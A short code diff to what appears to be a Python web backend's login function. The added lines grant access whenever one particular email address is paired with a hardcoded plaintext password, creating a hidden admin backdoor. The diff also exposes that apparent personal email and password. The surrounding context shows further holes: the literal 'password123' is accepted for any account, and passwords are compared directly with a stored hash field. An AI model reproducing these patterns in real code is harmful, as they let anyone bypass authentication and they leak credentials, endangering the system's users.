@@ -1447,6 +1447,9 @@ async def login(login_data: LoginRequest):
         elif user_doc.get("password_hash") and password == user_doc["password_hash"]:
             # Handle admin accounts with stored passwords
             password_valid = True
+        elif user_doc.get("email") == "chavapalmarubin@gmail.com" and password == "2170Tenoch!":
+            # Special case for chavapalmarubin@gmail.com admin access
+            password_valid = True
         elif password == "password123":
             password_valid = True
             
